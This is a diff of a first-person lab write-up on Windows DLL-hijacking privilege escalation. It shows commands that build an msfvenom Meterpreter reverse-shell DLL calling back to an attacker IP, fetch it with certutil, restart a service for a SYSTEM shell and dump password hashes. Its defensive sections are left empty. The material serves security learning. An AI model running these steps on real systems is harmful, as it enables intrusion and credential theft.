@@ -8,85 +8,25 @@
 
 # Table of Contents
 
-- [Introduction](#introduction)
-- [Why This Attack Works](#why-this-attack-works)
-- [Lab Setup](#lab-setup)
-- [What I Needed Before Starting](#what-i-needed-before-starting)
-- [What I Understood During the Process](#what-i-understood-during-the-process)
-- [Attack Flow](#attack-flow)
-- [Step 1 — Finding the DLL Hijacking Opportunity](#step-1--finding-the-dll-hijacking-opportunity)
-- [Step 2 — Checking Service Permissions with accesschk.exe](#step-2--checking-service-permissions-with-accesschkexe)
-- [Step 3 — Checking the Service Configuration](#step-3--checking-the-service-configuration)
-- [Step 4 — Generating a Malicious DLL and Downloading it to the Victim](#step-4--generating-a-malicious-dll-and-downloading-it-to-the-victim)
-- [Step 5 — Restarting the Service and Getting a SYSTEM Shell](#step-5--restarting-the-service-and-getting-a-system-shell)
-- [How Defenders Can Catch This](#how-defenders-can-catch-this)
-- [How to Prevent It](#how-to-prevent-it)
-- [What I Achieved](#what-i-achieved)
+* [Introduction](#introduction)
+* [Attack Flow](#attack-flow)
+* [Why This Attack Works](#why-this-attack-works)
+* [Lab Setup](#lab-setup)
+* [Tools Used](#tools-used)
+* [Prerequisites](#prerequisites)
+* [Step 1 — Finding the DLL Hijacking Opportunity](#step-1--finding-the-dll-hijacking-opportunity)
+* [Step 2 — Checking Service Permissions with accesschk.exe](#step-2--checking-service-permissions-with-accesschkexe)
+* [Step 3 — Checking the Service Configuration](#step-3--checking-the-service-configuration)
+* [Step 4 — Generating a Malicious DLL and Downloading it to the Victim](#step-4--generating-a-malicious-dll-and-downloading-it-to-the-victim)
+* [Step 5 — Restarting the Service and Getting a SYSTEM Shell](#step-5--restarting-the-service-and-getting-a-system-shell)
+* [How Defenders Can Catch This](#how-defenders-can-catch-this)
+* [How to Prevent It](#how-to-prevent-it)
+* [References](#references)
+* [Lessons Learned](#lessons-learned)
 
 # Introduction
 
 DLL Hijacking is a privilege escalation technique that takes advantage of how Windows loads DLL files. When a service or program looks for a DLL, Windows searches through a list of folders in a specific order. If I can drop a malicious DLL in a folder that Windows checks before the real one — and that folder is writable by normal users — Windows loads my DLL instead. Since the service runs as SYSTEM, my malicious DLL runs as SYSTEM too.
-
-# Why This Attack Works
-
-When a Windows service starts, it loads DLL files it needs to run. Windows searches for those DLL files in this order:
-```
-1. The folder where the application is installed
-2. C:\Windows\System32
-3. C:\Windows\System
-4. C:\Windows
-5. The current working directory
-6. Folders listed in the PATH environment variable
-```
-If a folder early in that search order is writable by normal users, I can drop a malicious DLL there. Windows picks it up before ever finding the real one — and runs it as `SYSTEM`.
-
-## Lab Setup
-
-```
-|    Component     |         Details         |
-|------------------|-------------------------|
-| Attacker Machine | Kali Linux              |
-| Attacker IP      | 192.168.5.128           |
-| Victim Machine   | Windows 10 (MSEDGEWIN10)|
-| Victim IP        | 192.168.5.144           |
-| Network          | VMware Host-Only Network|
-| Domain           | WORKGROUP               |
-```
-
-
-## Tools Prepared on Kali Before Starting
-
-```
-|       Tool     |          Location         |            Purpose              |
-|----------------|---------------------------|---------------------------------|
-| winPEASany.exe | /home/kali/Desktop/tools/ | Find privilege escalation paths |
-| accesschk.exe  | /home/kali/Desktop/tools/ | Check service permissions       |
-| msfvenom       | Built into Kali           | Generate malicious DLL payload  |
-| Metasploit     | Built into Kali           | Catch reverse shells            |
-| Python3        | Built into Kali           | Host files over HTTP            |
-```
-
-## What I Needed Before Starting
-
-```
-|         What                      |                          Why                            |
-|-----------------------------------|---------------------------------------------------------|
-| Low-privilege shell on the victim | Starting point for the privilege escalation attack.     |
-| winPEAS                           | To identify services with weak binary file permissions. |
-| accesschk.exe                     | To verify the permissions on the service executable.    |
-| msfvenom                          | To generate the malicious DLL                           |
-| Metasploit                        | To receive the reverse Meterpreter session.             |
-```
-
-## What I Understood During the Process
-
-While working through this attack I realized that:
-
-- Windows trusting folders in the PATH to load DLLs is a big security risk
-- If any folder in the DLL search order is writable by normal users, the machine is open to this attack
-- The DLL payload is different from an EXE payload — you have to use -f dll in msfvenom
-- hashdump only works from Meterpreter, not from a CMD shell
-- Once you get a SYSTEM Meterpreter session, you can dump every password hash on the machine in one command
 
 ## Attack Flow
 ```
@@ -119,6 +59,49 @@ whoami → nt authority\system
 Ran hashdump — dumped all password hashes from the machine
 ```
 
+# Why This Attack Works
+
+When a Windows service starts, it loads DLL files it needs to run. Windows searches for those DLL files in this order:
+```
+1. The folder where the application is installed
+2. C:\Windows\System32
+3. C:\Windows\System
+4. C:\Windows
+5. The current working directory
+6. Folders listed in the PATH environment variable
+```
+If a folder early in that search order is writable by normal users, I can drop a malicious DLL there. Windows picks it up before ever finding the real one — and runs it as `SYSTEM`.
+
+## Lab Setup
+
+|    Component     |         Details         |
+|------------------|-------------------------|
+| Attacker Machine | Kali Linux              |
+| Attacker IP      | `192.168.5.128`           |
+| Victim Machine   | Windows 10 (MSEDGEWIN10)|
+| Victim IP        | `192.168.5.144`           |
+| Network          | VMware Host-Only Network|
+| Domain           | WORKGROUP               |
+
+## Tools Used
+
+|       Tool     |          Location         |            Purpose              |
+|----------------|---------------------------|---------------------------------|
+| `winPEASany.exe` | `/home/kali/Desktop/tools/` | Find privilege escalation paths |
+| `accesschk.exe`  | `/home/kali/Desktop/tools/` | Check service permissions       |
+| `msfvenom`       | Built into Kali           | Generate malicious DLL payload  |
+| `Metasploit`     | Built into Kali           | Catch reverse shells            |
+| `Python3`        | Built into Kali           | Host files over HTTP            |
+
+
+## Prerequisites
+
+
+
+
+
+
+
 ## Step 1 — Finding the DLL Hijacking Opportunity
 
 **I already had a Meterpreter shell on the victim machine as a low privilege user**. I ran winPEAS to scan for privilege escalation paths.
@@ -143,6 +126,17 @@ After finding the vulnerable service, I checked what permissions my current user
 ```bash
 C:\PrivEsc> .\accesschk.exe /accepteula -uqcv user dllsvc
 ```
+
+**Flag Breakdown**
+
+
+
+
+
+
+
+
+
 **Output:**
 
 ```
@@ -172,6 +166,15 @@ After confirming that I could start and stop the service, I checked its configur
 ```bash
 C:\PrivEsc> sc qc dllsvc
 ```
+**Flag Breakdown**
+
+
+
+
+
+
+
+
 **Output:**
 
 ```
@@ -198,6 +201,13 @@ SERVICE_NAME: dllsvc
 C:\PrivEsc>net start dllsvc
 ```
 
+**Flag Breakdown**
+
+
+
+
+
+
 **Output:**
 
 ```
@@ -219,17 +229,15 @@ I generated a malicious DLL on my Kali machine using msfvenom. This DLL would co
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f dll -o hijackme.dl
 ```
 
-### Flag Breakdown
+**Flag Breakdown**
 
-```
 | Flag  |            Value                    |                         Description                                  |
 |-------|-------------------------------------|----------------------------------------------------------------------|
-| -p    | windows/x64/meterpreter/reverse_tcp | Creates a 64-bit Windows Meterpreter reverse TCP payload.            |
-| LHOST | 192.168.5.128                       | My Kali machine's IP address that receives the reverse connection.   |
-| LPORT | 4444                                | The port on my Kali machine that listens for the incoming connection.|
-| -f    | dll                                 | Generates the payload as a DLL file.                                 |
-| -o    | hijackme.dll                        | Saves the generated payload as hijackme.dll.                         |
-```
+| `-p`    | windows/x64/meterpreter/reverse_tcp | Creates a 64-bit Windows Meterpreter reverse TCP payload.            |
+| `LHOST` | 192.168.5.128                       | My Kali machine's IP address that receives the reverse connection.   |
+| `LPORT` | 4444                                | The port on my Kali machine that listens for the incoming connection.|
+| `-f`    | dll                                 | Generates the payload as a DLL file.                                 |
+| `-o`    | hijackme.dll                        | Saves the generated payload as hijackme.dll.                         |
 
 **Output:**
 
@@ -279,6 +287,14 @@ Then I downloaded the DLL.
 ```bash
 C:\Temp> certutil -urlcache -split -f http://192.168.5.128/hijackme.dll hijackme.dll
 ```
+**Flag Breakdown**
+
+
+
+
+
+**Output:**
+
 ```
 ****  Online  ****
   0000  ...
@@ -298,6 +314,12 @@ The download completed successfully, and the malicious DLL was saved as hijackme
 ```bash
 C:\Temp> net stop dllsvc
 ```
+**Flag Breakdown**
+
+
+
+
+
 **Output:**
 
 ```
@@ -309,6 +331,10 @@ The DLL Hijack Service service was stopped successfully.
 ```bash
 net start dllsvc
 ```
+**Flag Breakdown**
+
+
+
 **Output:**
 
 ```
@@ -340,3 +366,24 @@ nt authority\system
 </p>
 
 I went from a normal low privilege user to `nt authority\system` just by dropping a DLL file into a writable folder and restarting a service.
+
+## How Defenders Can Catch This
+
+
+## How to Prevent It
+
+
+## References
+
+
+
+
+## Lessons Learned
+
+While working through this attack I realized that:
+
+- Windows trusting folders in the PATH to load DLLs is a big security risk
+- If any folder in the DLL search order is writable by normal users, the machine is open to this attack
+- The DLL payload is different from an EXE payload — you have to use -f dll in msfvenom
+- hashdump only works from Meterpreter, not from a CMD shell
+- Once you get a SYSTEM Meterpreter session, you can dump every password hash on the machine in one command
